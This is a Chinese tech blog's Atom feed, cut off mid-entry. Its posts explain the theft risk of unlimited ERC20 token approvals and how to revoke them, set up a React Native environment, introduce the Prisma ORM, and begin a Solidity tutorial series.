<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>张智进的博客</title>
  
  <subtitle>智进技术</subtitle>
  <link href="https://www.memestarter.top/atom.xml" rel="self"/>
  
  <link href="https://www.memestarter.top/"/>
  <updated>2022-05-28T17:51:15.262Z</updated>
  <id>https://www.memestarter.top/</id>
  
  <author>
    <name>zzj</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>一文理清过度授权的是是非非</title>
    <link href="https://www.memestarter.top/2022/05/29/%E4%B8%80%E6%96%87%E7%90%86%E6%B8%85%E8%BF%87%E5%BA%A6%E6%8E%88%E6%9D%83%E7%9A%84%E6%98%AF%E6%98%AF%E9%9D%9E%E9%9D%9E/"/>
    <id>https://www.memestarter.top/2022/05/29/%E4%B8%80%E6%96%87%E7%90%86%E6%B8%85%E8%BF%87%E5%BA%A6%E6%8E%88%E6%9D%83%E7%9A%84%E6%98%AF%E6%98%AF%E9%9D%9E%E9%9D%9E/</id>
    <published>2022-05-28T17:06:17.000Z</published>
    <updated>2022-05-28T17:51:15.262Z</updated>
    
    <content type="html"><![CDATA[<h1 id="什么是过度授权"><a href="#什么是过度授权" class="headerlink" title="什么是过度授权"></a>什么是过度授权</h1><p>忘记在哪里看过一个脑静急转弯了。大致内容：如果你的区块链硬件钱包有10万元，玩dapp你最多能亏多少钱？答案显而易见：10万。当然，这个10万有很大可能不是dapp内部逻辑导致的亏损，而是因为它的钱包授权给了恶意DAPP，这个恶意dapp盗走了他的10万元。</p><p>这就是区块链世界的”黑暗森林“，大家都在猎杀金钱，活下去的的唯一途径就是别被第二者发现我们的低级错误。</p><h2 id="过度授权的案例"><a href="#过度授权的案例" class="headerlink" title="过度授权的案例"></a>过度授权的案例</h2><p>案例1： 2021 年 2 月份 ，中心化金融协议 Primitive由于合约漏洞，攻击者利用过度授权机制盗走了一部分资金。 <a href="https://cryptopotato.com/defi-protocol-primitive-finance-self-hacks-to-prevent-exploit/">https://cryptopotato.com/defi-protocol-primitive-finance-self-hacks-to-prevent-exploit/</a><br>案例2：2021 年 2 月份， <a href="https://rekt.news/furucombo-rekt/">https://rekt.news/furucombo-rekt/</a><br>案例3：我身边的朋友，自己偶尔玩玩dapp，自己本身也是做技术的，还被过度授权盗走了1000多U<br><img src="https://cdn.jsdelivr.net/gh/it114/blogcdn@master/blog/images20220529004454.png" alt="20220529004454"><br>更多过度授权案例 百度搜索：过度授权 或者 infinite approval  </p><h2 id="过度授权剖析"><a href="#过度授权剖析" class="headerlink" title="过度授权剖析"></a>过度授权剖析</h2><p>平时区块链转账，我们也没有使用过授权这个概念。授权这个概念大概是随着defi的兴起而火起来的，defi summber随便一个年化都很高，热钱涌动，进来了很多人。而这些defi大部分都是dapp，你需要授权给这些app使用你的资金，然后去赚钱。本质上，无论日常地址之间直接转账还是说dapp授权交易都是一个区块链的交易。怎么去区分和理解呢，如下图大致画 了一下我们平时转账交易和dapp授权的区别<br>日常转账交易（大致画了一下）<br><img src="https://cdn.jsdelivr.net/gh/it114/blogcdn@master/blog/images20220529005545.png" alt="20220529005545"><br>dapp授权交易<br><img src="https://cdn.jsdelivr.net/gh/it114/blogcdn@master/blog/images20220529010907.png" alt="20220529010907"></p><p>一言以蔽之，正常交易转账是自己直接转给地方地址。dapp授权是给第三方一个使用自己资金的权限，授权的时候可以指定币种和金额。<br>大家使用比较多的小狐狸授权页面如下，一旦遇到类似的页面，不熟悉的一定不要授权或者读取清楚每一个字。<br><img src="https://cdn.jsdelivr.net/gh/it114/blogcdn@master/blog/images20220529011159.png" alt="20220529011159"></p><h1 id="ERC20标准"><a href="#ERC20标准" class="headerlink" title="ERC20标准"></a>ERC20标准</h1><p>这个部分有一点偏技术，简单看一下，对于后边的内容会理解的更加深刻。ERC20标准大致是一个规定了以太坊区块链上的数字资产的生成，存储，转移等一系列操作的标准。有了这个标准之后，所有遵守ERC20协议的所有token之间既可以互操作了。</p><p>正常的erc20合约标准，大致有如下接口</p><p><a href="https://eips.ethereum.org/EIPS/eip-20">https://eips.ethereum.org/EIPS/eip-20</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">// https://github.com/ethereum/EIPs/issues/20</span><br><span class="line">  contract ERC20 &#123;</span><br><span class="line">      function totalSupply() constant returns (uint totalSupply);</span><br><span class="line">      function balanceOf(address _owner) constant returns (uint balance);</span><br><span class="line">      function transfer(address _to, uint _value) returns (bool success);</span><br><span class="line">      function transferFrom(address _from, address _to, uint _value) returns (bool success);</span><br><span class="line">      function approve(address _spender, uint _value) returns (bool success);</span><br><span class="line">      function allowance(address _owner, address _spender) constant returns (uint remaining);</span><br><span class="line">      event Transfer(address indexed _from, address indexed _to, uint _value);</span><br><span class="line">      event Approval(address indexed _owner, address indexed _spender, uint _value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><ul><li>totalSupply token的总供应量</li><li>balanceOf 查询某一个地址的token余额</li><li>transfer 转移token从一个地址到另外一个地址</li><li>transferFrom  第三方从一个地址Token转移到一个地址</li><li>approve 给予其他地址授予token使用权限</li><li>allowance 查询既定的地址授予了哪些全新</li><li>Transfer 事件，token 发生转移就会有这个事件日志</li><li>Approval 授权事件</li></ul><p>看到了吗？erc20标准就6个函数2个事件。让人失望的是，标准中没有我们期望看到的撤销授权的函数方法！！！ 具体啥原因我暂时没有想清楚</p><h2 id="从代码角度看，我的钱是怎么被恶意dapp盗走的"><a href="#从代码角度看，我的钱是怎么被恶意dapp盗走的" class="headerlink" title="从代码角度看，我的钱是怎么被恶意dapp盗走的"></a>从代码角度看，我的钱是怎么被恶意dapp盗走的</h2><p>这里假设有两个用户A和B。用户A有100U 而且授权给了B使用这100U 。过程如下</p><ol><li>A调用 approve(address(B), 100)，授予B使用A的100Usdt的权限</li><li>B使用的时候需要检查A到底给自己了多少usdt的使用额度：allowance(address(A), address(B))</li><li>B知道了自己的使用额度之后调用转账transferFrom(address(A), address(B), 100) 把100U 从A转到B</li></ol><p>过程就是这么的简单！！！！！</p><p>虽然  transferFrom 函数被用来了盗用token，但是的设计目标是允许经过授权的地址使用我的token，在如下场景还是有不少用的</p><ul><li>让他人代付gas费用</li><li>dapp中允许dapp支配自己的资金去赚取收益 </li><li>订阅web3的一些服务，自动扣款等</li></ul><h1 id="如何防范过度授权威胁"><a href="#如何防范过度授权威胁" class="headerlink" title="如何防范过度授权威胁"></a>如何防范过度授权威胁</h1><ul><li>不要使用来源不明或者自己不信任的dapp</li><li>定期使用撤销授权工具清理授权</li><li>养成良好的习惯，经常用来玩dapp的钱包别放太多资金。</li></ul><h2 id="如何手动撤销过度授权"><a href="#如何手动撤销过度授权" class="headerlink" title="如何手动撤销过度授权"></a>如何手动撤销过度授权</h2><ol><li>一些钱包例如，tokenpocket ，imtoken  ，mathwallet 内部都内置了过度授权清理工具。</li><li>一些第三方网站，例如<a href="https://approved.zone/">https://approved.zone/</a> ，debank，cointool 也都提供了类似的工具（提示：别因为清理授权被钓鱼了）</li><li>清理授权的过程是需要花费一定的gas 的 </li><li></li></ol><h2 id="过度授权一定能撤销干净吗"><a href="#过度授权一定能撤销干净吗" class="headerlink" title="过度授权一定能撤销干净吗"></a>过度授权一定能撤销干净吗</h2><h1 id="一种猜想"><a href="#一种猜想" class="headerlink" title="一种猜想"></a>一种猜想</h1><p>既然过度授权危害这么大。我有一些解决类似问题的想法。<br>建立一个权威的公用合约A。这个合约由一个dao组织运行，dapp项目方需要提供合约地址给合约A，一旦加入到合约A的白名单，就代表被加入的合约在一定程度上做了背书。加入白名单的项目方要么提供实名信息要么提供一些token质押，防止作恶。</p><p>在用户使用dapp的时候，不是直接授予权限给不受信任的dapp而是直接授权给dao运营的合约A。然后由合约A代理用户向目标合约做交互。</p><p>等于说在用户和目标dapp之间做了一个隔离，这个在一定程度上能解决授权过渡问题。</p><h1 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h1><p>其实，这个话题展开的话，能说很多。包括从代码角度可以写一个demo来演示都是没问题的。只有真正的让用户看到了过度授权的危害才能真正的警醒用户授权的时候留一个心眼。而屡屡有用户因为过度授权上当受骗，大概是因为狼来了的故事挺多了，反正这事也不会发生在我身上。</p><p>哎，这个话题又涉及到哲学高度了，涉及到了人类学了。也罢，到此为止。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;什么是过度授权&quot;&gt;&lt;a href=&quot;#什么是过度授权&quot; class=&quot;headerlink&quot; title=&quot;什么是过度授权&quot;&gt;&lt;/a&gt;什么是过度授权&lt;/h1&gt;&lt;p&gt;忘记在哪里看过一个脑静急转弯了。大致内容：如果你的区块链硬件钱包有10万元，玩dapp你最多能亏多少</summary>
      
    
    
    
    <category term="技术生活 - 编程技术 - 区块链" scheme="https://www.memestarter.top/categories/%E6%8A%80%E6%9C%AF%E7%94%9F%E6%B4%BB-%E7%BC%96%E7%A8%8B%E6%8A%80%E6%9C%AF-%E5%8C%BA%E5%9D%97%E9%93%BE/"/>
    
    
    <category term="区块链" scheme="https://www.memestarter.top/tags/%E5%8C%BA%E5%9D%97%E9%93%BE/"/>
    
    <category term="合约" scheme="https://www.memestarter.top/tags/%E5%90%88%E7%BA%A6/"/>
    
    <category term="solidity" scheme="https://www.memestarter.top/tags/solidity/"/>
    
    <category term="blockchain" scheme="https://www.memestarter.top/tags/blockchain/"/>
    
    <category term="科普" scheme="https://www.memestarter.top/tags/%E7%A7%91%E6%99%AE/"/>
    
  </entry>
  
  <entry>
    <title>react-native-environment</title>
    <link href="https://www.memestarter.top/2022/05/23/react-native-environment/"/>
    <id>https://www.memestarter.top/2022/05/23/react-native-environment/</id>
    <published>2022-05-23T06:23:16.000Z</published>
    <updated>2022-05-23T07:33:05.568Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前置条件"><a href="#前置条件" class="headerlink" title="前置条件"></a>前置条件</h2><p>由于react本质上是一套前端的开发流程，所以类似node ，npm等是必不可少的</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">brew install node</span><br><span class="line">brew install watchman</span><br></pre></td></tr></table></figure><p>其中 watchman是用来监测文件变化的。</p><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>这里区分ios和安卓开发环境。最简单的，安卓安装android studio，ios就安装xcode ~ 如果在遇到其他问题，搜一下，一下子就出来了。</p><h2 id="创建项目"><a href="#创建项目" class="headerlink" title="创建项目"></a>创建项目</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npx react-native init AwesomeProject</span><br></pre></td></tr></table></figure><h2 id="运行项目"><a href="#运行项目" class="headerlink" title="运行项目"></a>运行项目</h2><p>在项目根目录运行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npx react-native start</span><br></pre></td></tr></table></figure><p>这个命令把项目用到的所有依赖和代码合并成一个js文件。</p><h3 id="安卓平台"><a href="#安卓平台" class="headerlink" title="安卓平台"></a>安卓平台</h3><p>运行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npx react-native run-android</span><br></pre></td></tr></table></figure><p>安卓平台还可以打开Android studio，然后导入代码目录下面的android文件夹编译，安装。</p><p>如果报错，在命令行输入命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adb reverset tcp:8081 tcp:8081 </span><br></pre></td></tr></table></figure><p>这句的意思是把电脑的8081端口的内容转发给手机端8081端口</p><h3 id="ios平台"><a href="#ios平台" class="headerlink" title="ios平台"></a>ios平台</h3><p>打开ios目录下的workspace，运行就很简单了，这里提一下签名。</p><ol><li>必须使用苹果官方数据线。否则无法识别设备</li><li>需要一个mobileprovision文件，这是一个描述文件。他包含的信息说明使用什么证书打包、AppID是什么、打包的App包含了哪些功能、可以在哪些设备上安装，则是通过Provisioning Profile 描述文件。</li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;前置条件&quot;&gt;&lt;a href=&quot;#前置条件&quot; class=&quot;headerlink&quot; title=&quot;前置条件&quot;&gt;&lt;/a&gt;前置条件&lt;/h2&gt;&lt;p&gt;由于react本质上是一套前端的开发流程，所以类似node ，npm等是必不可少的&lt;/p&gt;
&lt;figure class=&quot;h</summary>
      
    
    
    
    <category term="技术生活 - 编程技术 - 前端" scheme="https://www.memestarter.top/categories/%E6%8A%80%E6%9C%AF%E7%94%9F%E6%B4%BB-%E7%BC%96%E7%A8%8B%E6%8A%80%E6%9C%AF-%E5%89%8D%E7%AB%AF/"/>
    
    
    <category term="react" scheme="https://www.memestarter.top/tags/react/"/>
    
  </entry>
  
  <entry>
    <title>Prisma入门</title>
    <link href="https://www.memestarter.top/2022/05/16/Prisma%E5%85%A5%E9%97%A8/"/>
    <id>https://www.memestarter.top/2022/05/16/Prisma%E5%85%A5%E9%97%A8/</id>
    <published>2022-05-16T08:24:19.000Z</published>
    <updated>2022-05-16T09:42:39.887Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Prisma-是什么"><a href="#Prisma-是什么" class="headerlink" title="Prisma 是什么"></a>Prisma 是什么</h1><p>Prisma是适用于Node.js和TypeScript的下一代开源ORM。ORM:对象关系映射（Object Relational Mapping）是一种程序设计技术。简单来说ORM可以将我们的底层数据库的各种操作进行一定的封装，我们就可以通过更加熟悉的开发语言来书写对应的数据库命令，ORM则可以将这些数据库操作命令转换为对应的SQL语句。GitHub上star数量很高，开发很活跃，社区也不错。关键是它的异步性，让JavaScript也拥有了高效查询db的能力。<br>Prisma它包含以下工具：</p><ul><li>Prisma Client—— 自动生成且类型安全的数据库客户端，这里边指定了语言和数据库啥的</li><li>Prisma Migrate—— 声明式数据建模和可自定义的迁移，和laravel或者thinkphp中的迁移概念类似</li><li>Prisma Studio—— 现代化的用户界面，可查看和编辑数据，可以想象为phhmyadmin</li></ul><h1 id="Prisma-环境配置"><a href="#Prisma-环境配置" class="headerlink" title="Prisma 环境配置"></a>Prisma 环境配置</h1><p>前提，nodejs必须安装<br>在这个前提下安装prisma</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install prisma typescript ts-node @types/node --save-dev</span><br></pre></td></tr></table></figure><h1 id="Prisma-基本用法"><a href="#Prisma-基本用法" class="headerlink" title="Prisma 基本用法"></a>Prisma 基本用法</h1><h2 id="创建项目"><a href="#创建项目" class="headerlink" title="创建项目"></a>创建项目</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mkdir prisma</span><br><span class="line">npm init -y </span><br></pre></td></tr></table></figure><p>上面的命会初始化一个npm项目，然后安装prisma依赖</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install prisma -D </span><br></pre></td></tr></table></figure><p>安装之后，我们就可以使用npx命令了。 可以通过npx prisma init -h命令来查看prisma的命令<br><img src="https://cdn.jsdelivr.net/gh/it114/blogcdn@master/blog/images20220516164320.png" alt="20220516164320"></p><p>我们看到了prisma帮助信息中有一个init命令，这个就是我们用来初始化prisma的关键命令，这里我们初始化一个mysql的数据库文件</p><p>init指定数据库的格式是：*** DATABASE_URL&#x3D;”mysql:&#x2F;&#x2F;<USER>:<PASSWORD>@HOST:PORT&#x2F;DATABASE” ***</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npx prisma init --url mysql://root:123456@localhost:3306/mydb</span><br></pre></td></tr></table></figure><p>来看看，执行之后，这个命令做了那些事情</p><ol><li>生成了一个.env文件</li><li>生成了prisma文件夹，里面有一个schema.prisma这个文件是我们后面用到的关键</li></ol><p>在根目录目前下面的文件大致如下<br><img src="https://cdn.jsdelivr.net/gh/it114/blogcdn@master/blog/images20220516165016.png" alt="20220516165016"></p><h2 id="prisma使用"><a href="#prisma使用" class="headerlink" title="prisma使用"></a>prisma使用</h2><h3 id="使用-Prisma-Migrate-创建数据表"><a href="#使用-Prisma-Migrate-创建数据表" class="headerlink" title="使用 Prisma Migrate 创建数据表"></a>使用 Prisma Migrate 创建数据表</h3><p>目前schema.prisma文件长这样。定义了两个表模型，User和Profile ，这两个表通过userId关联</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">// This is your Prisma schema file,</span><br><span class="line">// learn more about it in the docs: https://pris.ly/d/prisma-schema</span><br><span class="line"></span><br><span class="line">generator client &#123;</span><br><span class="line">  provider = &quot;prisma-client-js&quot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">datasource db &#123;</span><br><span class="line">  provider = &quot;mysql&quot;</span><br><span class="line">  url      = env(&quot;DATABASE_URL&quot;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">model User &#123;</span><br><span class="line">  id      Int      @id @default(autoincrement())</span><br><span class="line">  email   String   @unique</span><br><span class="line">  name    String?</span><br><span class="line">  profile Profile?</span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">model Profile &#123;</span><br><span class="line">  id     Int     @id @default(autoincrement())</span><br><span class="line">  bio    String?</span><br><span class="line">  user   User    @relation(fields: [userId], references: [id])</span><br><span class="line">  userId Int     @unique</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="使用-Prisma"><a href="#使用-Prisma" class="headerlink" title="使用 Prisma"></a>使用 Prisma</h3><p>使用迁移文件初始化数据库</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">npx prisma migrate dev --name init</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>看看执行这个命令发生了什么吧</p><ol><li>生成数据库迁移文件</li><li>执行数据库迁移文件<br><img src="https://cdn.jsdelivr.net/gh/it114/blogcdn@master/blog/images20220516170012.png" alt="20220516170012"></li></ol><p>执行CRUD<br>在执行之前需要创建一个ts文件，这里我们创建一个index.ts的文件&#96; </p><ol><li>创建一个用户<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">// create </span><br><span class="line">  const  c = await prismaClient.user.create(&#123;</span><br><span class="line">     data:&#123;</span><br><span class="line">         name:&#x27;xx&#x27;,</span><br><span class="line">         email:&#x27;123@qqq.com&#x27;,</span><br><span class="line">         profile:&#123;</span><br><span class="line">             create:&#123;bio:&#x27;im a girl&#x27;&#125;</span><br><span class="line">         &#125;</span><br><span class="line">     &#125;,</span><br><span class="line">  &#125;);</span><br></pre></td></tr></table></figure></li><li>查询一个用户<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">const user =  prismaClient.user.findFirst();</span><br><span class="line">console.dir(user, &#123; depth: null &#125;) </span><br></pre></td></tr></table></figure></li></ol><p>完整代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">import &#123;  PrismaClient &#125; from &#x27;@prisma/client&#x27;</span><br><span class="line">const prismaClient = new PrismaClient();</span><br><span class="line"></span><br><span class="line">async function main() &#123; </span><br><span class="line">    // create </span><br><span class="line">    const  c = await prismaClient.user.create(&#123;</span><br><span class="line">       data:&#123;</span><br><span class="line">           name:&#x27;xx&#x27;,</span><br><span class="line">           email:&#x27;123@qqq.com&#x27;,</span><br><span class="line">           profile:&#123;</span><br><span class="line">               create:&#123;bio:&#x27;im a girl&#x27;&#125;</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;,</span><br><span class="line">    &#125;);</span><br><span class="line">    </span><br><span class="line">    console.log(&#x27;create user status = &#x27; + c );</span><br><span class="line">    const user =  prismaClient.user.findFirst();</span><br><span class="line">    console.dir(user, &#123; depth: null &#125;) </span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">main()</span><br><span class="line">  .catch((e) =&gt; &#123;</span><br><span class="line">    throw e</span><br><span class="line">  &#125;).finally(async () =&gt; &#123;</span><br><span class="line">    await prismaClient.$disconnect()</span><br><span class="line">&#125;)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>运行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">npx ts-node index.ts </span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>数据库运行效果<br><img src="https://cdn.jsdelivr.net/gh/it114/blogcdn@master/blog/images20220516173323.png" alt="20220516173323"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Prisma-是什么&quot;&gt;&lt;a href=&quot;#Prisma-是什么&quot; class=&quot;headerlink&quot; title=&quot;Prisma 是什么&quot;&gt;&lt;/a&gt;Prisma 是什么&lt;/h1&gt;&lt;p&gt;Prisma是适用于Node.js和TypeScript的下一代开源ORM。</summary>
      
    
    
    
    <category term="技术生活 - 编程技术 - JavaScript" scheme="https://www.memestarter.top/categories/%E6%8A%80%E6%9C%AF%E7%94%9F%E6%B4%BB-%E7%BC%96%E7%A8%8B%E6%8A%80%E6%9C%AF-JavaScript/"/>
    
    
    <category term="Prisma" scheme="https://www.memestarter.top/tags/Prisma/"/>
    
    <category term="NodeJS" scheme="https://www.memestarter.top/tags/NodeJS/"/>
    
    <category term="Javasctipt" scheme="https://www.memestarter.top/tags/Javasctipt/"/>
    
    <category term="TypeScript" scheme="https://www.memestarter.top/tags/TypeScript/"/>
    
  </entry>
  
  <entry>
    <title>区块链合约之10天学会solidity第四节-基本数据结构</title>
    <link href="https://www.memestarter.top/2022/05/01/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%90%88%E7%BA%A6%E4%B9%8B10%E5%A4%A9%E5%AD%A6%E4%BC%9Asolidity%E7%AC%AC%E5%9B%9B%E8%8A%82-%E5%9F%BA%E6%9C%AC%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"/>
    <id>https://www.memestarter.top/2022/05/01/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%90%88%E7%BA%A6%E4%B9%8B10%E5%A4%A9%E5%AD%A6%E4%BC%9Asolidity%E7%AC%AC%E5%9B%9B%E8%8A%82-%E5%9F%BA%E6%9C%AC%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/</id>
    <published>2022-05-01T05:30:12.000Z</published>
    <updated>2022-05-28T14:55:11.046Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>学solidity已经2年了，平日除了偶尔写一点点合约喝读一点合约之外，几乎没有用武之地（工作中也用不到）。导致目前渐渐的有些生疏了。现在捡起来，希望有人一起再次一起学习。学习学习，有输入和输出才能学的更好。所以，我计划，没两天更新一波学习记录。我会把学习记录写成系列文章，把代码放到github，期待一起进步。也请大家到我的GitHub 给我star呀！也欢迎给我留言加个好友啥的。如果给我star的，联系我我会拉个共同学习的群v（jingyiwei）。<br>GitHub：<a href="mailto:&#103;&#105;&#116;&#64;&#x67;&#105;&#116;&#x68;&#x75;&#98;&#x2e;&#99;&#x6f;&#109;">&#103;&#105;&#116;&#64;&#x67;&#105;&#116;&#x68;&#x75;&#98;&#x2e;&#99;&#x6f;&#109;</a>:it114&#x2F;learn-solidity-30day.git<br>本文原文发表在张智进博客：<a href="https://www.memestarter.top/">https://www.memestarter.top/</a></p><h1 id="合约数据类型"><a href="#合约数据类型" class="headerlink" title="合约数据类型"></a>合约数据类型</h1>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;学solidity已经2年了，平日除了偶尔写一点点合约喝读一点合约之外，几乎没有用武之地（工作中也用不到）。导致目前渐渐的有些生疏了。现在捡</summary>
      
    
    
    
    <category term="技术生活 - 编程技术 - 区块链" scheme="https://www.memestarter.top/categories/%E6%8A%80%E6%9C%AF%E7%94%9F%E6%B4%BB-%E7%BC%96%E7%A8%8B%E6%8A%80%E6%9C%AF-%E5%8C%BA%E5%9D%97%E9%93%BE/"/>
    
    
    <category term="区块链" scheme="https://www.memestarter.top/tags/%E5%8C%BA%E5%9D%97%E9%93%BE/"/>
    
    <category term="合约" scheme="https://www.memestarter.top/tags/%E5%90%88%E7%BA%A6/"/>
    
    <category term="教程" scheme="https://www.memestarter.top/tags/%E6%95%99%E7%A8%8B/"/>
    
    <category term="solidity" scheme="https://www.memestarter.top/tags/solidity/"/>
    
    <category term="blockchain" scheme="https://www.memestarter.top/tags/blockchain/"/>
    
  </entry>
  
  <entry>
    <title>区块链合约之10天学会solidity第二节-初识合约</title>
    <link href="https://www.memestarter.top/2022/04/30/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%90%88%E7%BA%A6%E4%B9%8B10%E5%A4%A9%E5%AD%A6%E4%BC%9Asolidity%E7%AC%AC%E4%BA%8C%E8%8A%82-%E5%88%9D%E8%AF%86%E5%90%88%E7%BA%A6/"/>
    <id>https://www.memestarter.top/2022/04/30/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%90%88%E7%BA%A6%E4%B9%8B10%E5%A4%A9%E5%AD%A6%E4%BC%9Asolidity%E7%AC%AC%E4%BA%8C%E8%8A%82-%E5%88%9D%E8%AF%86%E5%90%88%E7%BA%A6/</id>
    <published>2022-04-30T10:44:32.000Z</published>
    <updated>2022-05-08T04:18:29.036Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>学solidity已经2年了，平日除了偶尔写一点点合约喝读一点合约之外，几乎没有用武之地（工作中也用不到）。导致目前渐渐的有些生疏了。现在捡起来，希望有人一起再次一起学习。学习学习，有输入和输出才能学的更好。所以，我计划，没两天更新一波学习记录。我会把学习记录写成系列文章，把代码放到github，期待一起进步。也请大家到我的GitHub 给我star呀！也欢迎给我留言加个好友啥的。如果给我star的，联系我我会拉个共同学习的群v（jingyiwei）。<br>GitHub：<a href="mailto:&#x67;&#x69;&#116;&#64;&#103;&#x69;&#116;&#104;&#x75;&#98;&#46;&#x63;&#x6f;&#109;">&#x67;&#x69;&#116;&#64;&#103;&#x69;&#116;&#104;&#x75;&#98;&#46;&#x63;&#x6f;&#109;</a>:it114&#x2F;learn-solidity-30day.git<br>本文原文发表在张智进博客：<a href="https://www.memestarter.top/">https://www.memestarter.top/</a></p><h1 id="合约结构"><a href="#合约结构" class="headerlink" title="合约结构"></a>合约结构</h1><h2 id="最简单的合约"><a href="#最简单的合约" class="headerlink" title="最简单的合约"></a>最简单的合约</h2><p>下面来看一段最简单的合约</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.4.0;</span><br><span class="line">contract SimpleStorage &#123;</span><br><span class="line">    string message;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>分开来看</p><ul><li>第一行，代表合约所使用的许可证。不写也无所谓，不会报错；同时使用&#x2F;&#x2F;符号注释这一行，代表这一行不会被编译器编译</li><li>第二行，pragma 编译器指令 告诉编译器 合约使用 solidity编程语言，最低只是的solidity语言版本是 0.4.0。需要注意的是，pragma指令只对当前的文件起作用。^0.4.0 表示可以使用的版本为 0.4.0-0.4.9  之间的任意版本，但不能超过 0.5.0 